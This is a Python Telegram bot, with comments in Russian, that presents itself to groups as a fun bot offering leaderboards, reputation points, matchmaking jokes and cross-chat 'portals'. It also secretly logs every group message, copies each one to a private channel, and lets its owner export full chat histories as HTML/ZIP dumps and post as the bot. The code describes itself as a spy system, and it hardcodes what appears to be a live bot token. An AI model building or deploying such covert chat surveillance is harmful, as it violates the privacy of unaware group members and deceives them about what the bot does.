import os
import threading
from flask import Flask
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReactionTypeEmoji
import sqlite3
import random
import zipfile
import io
import html

# --- НАСТРОЙКИ ---
BOT_TOKEN = '8304060216:AAFlFiARVda3ydlLCT0WtPbMBT3tapZU1pI'
ADMIN_ID = 8705859046           # Твой личный ID
LOG_CHANNEL_ID = -1004316644119 # ID твоего приватного канала (обязательно начинается с -100)

bot = telebot.TeleBot(BOT_TOKEN)

# --- ИНИЦИАЛИЗАЦИЯ БАЗЫ ---
conn = sqlite3.connect('chat_logger.db', check_same_thread=False)
cursor = conn.cursor()

# Таблица логов
cursor.execute('''
    CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        chat_title TEXT,
        user_id INTEGER,
        username TEXT,
        text TEXT,
        media_type TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
''')
# Таблица репутации
cursor.execute('''
    CREATE TABLE IF NOT EXISTS reputation (
        chat_id INTEGER,
        user_id INTEGER,
        username TEXT,
        score INTEGER DEFAULT 0,
        PRIMARY KEY(chat_id, user_id)
    )
''')
# Таблица настроек (для сохранения гифки)
cursor.execute('''
    CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )
''')
conn.commit()

# --- ПАНЕЛЬ УПРАВЛЕНИЯ ДАМПАМИ В ЛС ---

@bot.message_handler(commands=['dump', 'start'], func=lambda m: m.chat.type == 'private')
def pm_menu(message):
    if message.from_user.id != ADMIN_ID: return
    cursor.execute('SELECT DISTINCT chat_id, chat_title FROM messages')
    chats = cursor.fetchall()
    
    if not chats:
        bot.send_message(message.chat.id, "🗄 База пуста. Бот еще ничего не перехватил.")
        return
        
    markup = InlineKeyboardMarkup()
    for chat_id, title in chats:
        chat_name = title if title else str(chat_id)
        markup.add(InlineKeyboardButton(text=f"📁 Дамп: {chat_name}", callback_data=f"dump_{chat_id}"))
        
    bot.send_message(message.chat.id, "🕵️‍♂️ Меню управления дампами:", reply_markup=markup)


# --- ГЕНЕРАЦИЯ HTML И ZIP АРХИВА ---
def generate_html_dump(chat_title, msgs):
    html_out = f"""<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8">
    <title>Дамп чата: {html.escape(chat_title)}</title>
    <style>
        body {{ background-color: #0e1621; color: #fff; font-family: sans-serif; padding: 20px; }}
        .chat-container {{ max-width: 800px; margin: 0 auto; background: #17212b; padding: 20px; border-radius: 10px; }}
        .header {{ text-align: center; border-bottom: 1px solid #242f3d; padding-bottom: 10px; margin-bottom: 20px; }}
        .msg {{ margin-bottom: 15px; padding: 10px; border-radius: 8px; background: #182533; display: inline-block; min-width: 250px; max-width: 90%; }}
        .msg-author {{ color: #64b5f6; font-weight: bold; margin-bottom: 5px; font-size: 14px; }}
        .msg-text {{ font-size: 15px; line-height: 1.4; word-wrap: break-word; }}
        .msg-media {{ color: #ffb74d; font-size: 12px; margin-top: 5px; font-style: italic; }}
        .msg-time {{ color: #6a7b8c; font-size: 11px; text-align: right; margin-top: 5px; }}
    </style></head><body>
    <div class="chat-container">
        <div class="header"><h2>📁 Дамп чата: {html.escape(chat_title)}</h2><p>Всего сообщений: {len(msgs)}</p></div>
    """
    for m in msgs:
        name = html.escape(m[1] or "Аноним")
        text = html.escape(m[2] or "").replace('\n', '<br>')
        media = f"<div class='msg-media'>[Вложение: {m[3]}]</div>" if m[3] else ""
        time_str = m[4]
        
        html_out += f"""<div class="msg"><div class="msg-author">{name}</div>
        <div class="msg-text">{text}</div>{media}<div class="msg-time">{time_str}</div></div><br>"""
    
    html_out += "</div></body></html>"
    return html_out

@bot.callback_query_handler(func=lambda call: call.data.startswith('dump_'))
def handle_dump_request(call):
    if call.from_user.id != ADMIN_ID: return
    target_chat_id = call.data.split('_')[1]
    
    bot.answer_callback_query(call.id, "Инициализация сборки...")
    bot.edit_message_text(f"⏳ Готовлю HTML-архив для чата <code>{target_chat_id}</code>...", call.message.chat.id, call.message.message_id, parse_mode='HTML')
    
    cursor.execute('SELECT chat_title, username, text, media_type, timestamp FROM messages WHERE chat_id = ? ORDER BY timestamp ASC', (target_chat_id,))
    msgs = cursor.fetchall()
    
    if not msgs:
        bot.edit_message_text("❌ В базе нет сообщений из этого чата.", call.message.chat.id, call.message.message_id)
        return

    chat_title = msgs[0][0] or str(target_chat_id)
    html_content = generate_html_dump(chat_title, msgs)
    
    # Создаем ZIP архив в оперативной памяти
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr('index.html', html_content.encode('utf-8'))
        zip_file.writestr('media/', b'') # Создаем пустую папку для медиа (на будущее)
    
    zip_buffer.seek(0)
    zip_buffer.name = f"dump_{target_chat_id}.zip"
    
    bot.edit_message_text(f"✅ Дамп чата <b>{chat_title}</b> успешно собран! Отправляю файл...", call.message.chat.id, call.message.message_id, parse_mode='HTML')
    bot.send_document(call.message.chat.id, zip_buffer, caption=f"📁 Полный архив переписки: {chat_title}")


# --- КОМАНДА /gif (ЗАМЕНА ГИФКИ ДЛЯ ПОРТАЛА) ---
@bot.message_handler(commands=['gif'], func=lambda m: m.chat.type == 'private')
def cmd_gif(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.send_message(message.chat.id, "🌀 Пришли мне гифку (анимацию), которую я буду использовать для открытия порталов:")
    bot.register_next_step_handler(msg, process_gif_save)

def process_gif_save(message):
    if not message.animation and not message.document:
        bot.send_message(message.chat.id, "❌ Это не гифка. Попробуй вызвать /gif еще раз.")
        return
    
    file_id = message.animation.file_id if message.animation else message.document.file_id
    cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('portal_gif', file_id))
    conn.commit()
    bot.send_message(message.chat.id, "✅ Отлично! Гифка для порталов успешно обновлена и сохранена в базу.")


# --- КОМАНДА /face (ПИСАТЬ ОТ ЛИЦА БОТА) ---
@bot.message_handler(commands=['face'], func=lambda m: m.chat.type == 'private')
def cmd_face(message):
    if message.from_user.id != ADMIN_ID: return
    cursor.execute('SELECT DISTINCT chat_id, chat_title FROM messages')
    chats = cursor.fetchall()
    if not chats:
        bot.send_message(message.chat.id, "Я еще не состою ни в одном чате с историей.")
        return
    markup = InlineKeyboardMarkup()
    for chat_id, title in chats:
        markup.add(InlineKeyboardButton(text=f"🗣 {title or chat_id}", callback_data=f"face_{chat_id}"))
    bot.send_message(message.chat.id, "🎭 От чьего лица вещаем? Выбери чат:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('face_'))
def handle_face_selection(call):
    if call.from_user.id != ADMIN_ID: return
    chat_id = call.data.split('_')[1]
    bot.answer_callback_query(call.id)
    msg = bot.send_message(call.message.chat.id, "✍️ Напиши текст, который я должен отправить:")
    bot.register_next_step_handler(msg, lambda m: bot.send_message(chat_id, m.text) if m.text else bot.send_message(m.chat.id, "❌ Только текст."))


# --- ПУБЛИЧНЫЕ КОМАНДЫ (Для групп) ---
@bot.message_handler(commands=['whoactive', 'top'])
def cmd_whoactive(message):
    if message.chat.type == 'private': return
    cursor.execute('SELECT username, COUNT(*) as c FROM messages WHERE chat_id = ? GROUP BY user_id ORDER BY c DESC LIMIT 5', (message.chat.id,))
    top_users = cursor.fetchall()
    cursor.execute('SELECT username, score FROM reputation WHERE chat_id = ? AND score > 0 ORDER BY score DESC LIMIT 3', (message.chat.id,))
    top_rep = cursor.fetchall()

    text = "🔥 <b>Топ активности:</b>\n"
    if top_users:
        medals = ['🥇', '🥈', '🥉', '🏅', '🏅']
        for i, u in enumerate(top_users): text += f"{medals[i]} {u[0] or 'Аноним'} — {u[1]} сообщ.\n"
    else: text += "Пока пусто.\n"
    if top_rep:
        text += "\n🌟 <b>Самые уважаемые:</b>\n"
        for i, r in enumerate(top_rep): text += f"⭐️ {r[0] or 'Аноним'} — {r[1]} реп.\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['info'])
def cmd_info(message):
    total_msgs = cursor.execute('SELECT COUNT(*) FROM messages').fetchone()[0]
    total_chats = cursor.execute('SELECT COUNT(DISTINCT chat_id) FROM messages').fetchone()[0]
    is_admin = "🛡 Да (Владелец системы)" if message.from_user.id == ADMIN_ID else "👤 Нет (Обычный агент)"
    info_text = f"🤖 <b>Шпионская система eChat</b>\n\n📊 Сообщений в базе: <b>{total_msgs}</b>\n🌐 Активных чатов: <b>{total_chats}</b>\n🔐 Права админа: {is_admin}\n\n<i>«Мы видим то, что скрыто от глаз...» 🕵️‍♂️</i>"
    bot.reply_to(message, info_text, parse_mode="HTML")

@bot.message_handler(commands=['portal'])
def cmd_portal(message):
    if message.chat.type == 'private': return
    cursor.execute('SELECT DISTINCT chat_id, chat_title FROM messages WHERE chat_id != ?', (message.chat.id,))
    other_chats = cursor.fetchall()
    if not other_chats:
        bot.reply_to(message, "🌀 Некуда открывать портал — я пока не состою в других чатах!")
        return

    target_chat_id, target_title = random.choice(other_chats)
    portal_text = message.text.replace('/portal', '').strip()
    
    # Достаем кастомную гифку из БД (или используем дефолтную ссылку)
    cursor.execute('SELECT value FROM settings WHERE key = "portal_gif"')
    gif_row = cursor.fetchone()
    portal_animation = gif_row[0] if gif_row else "https://media.giphy.com/media/3oKIPnAiaMCws8nOsE/giphy.gif"
    
    try:
        bot.send_animation(message.chat.id, portal_animation, caption="🌀 <b>Портал открыт!</b> Связь установлена...", parse_mode="HTML")
    except:
        bot.reply_to(message, "🌀 <b>Портал открыт!</b>")

    out_text = f"🌀 <b>Входящий портал из чата «{message.chat.title or 'Беседа'}»</b>\n👤 <b>@{message.from_user.username or message.from_user.first_name}:</b> {portal_text if portal_text else 'Приветствуем!'}"
    try: bot.send_message(target_chat_id, out_text, parse_mode="HTML")
    except: pass


# --- ГЛАВНЫЙ СЛУХАЧ (Группы: Запись, Триггеры, Реакции) ---
@bot.message_handler(func=lambda m: m.chat.type in ['group', 'supergroup'], content_types=['text', 'photo', 'video', 'voice', 'document', 'animation', 'sticker'])
def log_and_interact(message):
    if message.text and message.text.startswith('/'): return
    
    chat_id, chat_title = message.chat.id, message.chat.title
    user_id, username = message.from_user.id, message.from_user.username or message.from_user.first_name
    text_content = message.text or message.caption or ""
    text_lower = text_content.lower().strip()
    
    # 1. ЗАПИСЬ
    cursor.execute('INSERT INTO messages (chat_id, chat_title, user_id, username, text, media_type) VALUES (?, ?, ?, ?, ?, ?)', 
                   (chat_id, chat_title, user_id, username, text_content, message.content_type))
    conn.commit()

    # 2. ПЕРЕСЫЛКА
    try:
        copied = bot.copy_message(LOG_CHANNEL_ID, chat_id, message.message_id)
        fwd = "\n🔄 Переслано" if message.forward_from or hasattr(message, 'forward_sender_name') and message.forward_sender_name else ""
        bot.send_message(LOG_CHANNEL_ID, f"📍 Чат: {chat_title}\n👤 От: @{username}{fwd}", reply_to_message_id=copied.message_id)
    except: pass

    # 3. РЕПУТАЦИЯ
    if message.reply_to_message and text_lower in ['+', '👍', 'спасибо', 'спс', 'лучший']:
        target = message.reply_to_message.from_user
        if target.id != user_id and not target.is_bot:
            t_name = target.username or target.first_name
            cursor.execute('INSERT OR IGNORE INTO reputation (chat_id, user_id, username, score) VALUES (?, ?, ?, 0)', (chat_id, target.id, t_name))
            cursor.execute('UPDATE reputation SET score = score + 1 WHERE chat_id = ? AND user_id = ?', (chat_id, target.id))
            conn.commit()
            bot.reply_to(message, f"📈 Репутация <b>{t_name}</b> повышена!", parse_mode="HTML")

    # 4. ТРИГГЕРЫ
    elif text_lower.startswith(('бот, кто', 'бот кто')):
        cursor.execute('SELECT DISTINCT username FROM messages WHERE chat_id = ? AND username IS NOT NULL', (chat_id,))
        users = [row[0] for row in cursor.fetchall()]
        if users: bot.reply_to(message, f"Я думаю, что @{random.choice(users)} {random.choice(['❄️', '⛄', '🧊', '🎿', '🏂', '🏔'])}")
    
    elif text_lower.startswith(('бот, шип', 'бот шип')):
        cursor.execute('SELECT DISTINCT username FROM messages WHERE chat_id = ? AND username IS NOT NULL', (chat_id,))
        users = [row[0] for row in cursor.fetchall()]
        if len(users) >= 2:
            p = random.sample(users, 2)
            bot.reply_to(message, f"🕵️‍♂️ Агентурная сеть докладывает:\n\n@{p[0]} и @{p[1]} совместимы на {random.randint(0, 100)}% 💘")

    # 5. РЕАКЦИИ (10%)
    if random.randint(1, 100) <= 10:
        try: bot.set_message_reaction(chat_id, message.message_id, [ReactionTypeEmoji(random.choice(['👍', '🔥', '👀', '🤣', '🤔', '😎', '🎉']))], is_big=False)
        except: pass


# --- ЗАПУСК ---
def notify_startup():
    chats = cursor.execute('SELECT DISTINCT chat_id, chat_title FROM messages').fetchall()
    chat_list = "\n".join([f"🔸 {t or c}" for c, t in chats]) if chats else "База пока пуста."
    try: bot.send_message(ADMIN_ID, f"🫡 Я в строю!\n\nРаботаю в этих чатах:\n{chat_list}")
    except: pass

# --- МИКРО-СЕРВЕР ДЛЯ RENDER ---
app = Flask(__name__)

@app.route('/')
def keep_alive():
    return "Шпион в сети и работает! 🕵️‍♂️"

def run_flask():
    # Render сам выдает нужный порт через переменные окружения
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- ЗАПУСК ---
if __name__ == '__main__':
    print("Шпион запущен!")
    notify_startup()
    
    # Запускаем Flask в фоновом потоке, чтобы он не мешал боту
    threading.Thread(target=run_flask).start()
    
    # Запускаем самого бота
    bot.infinity_polling()
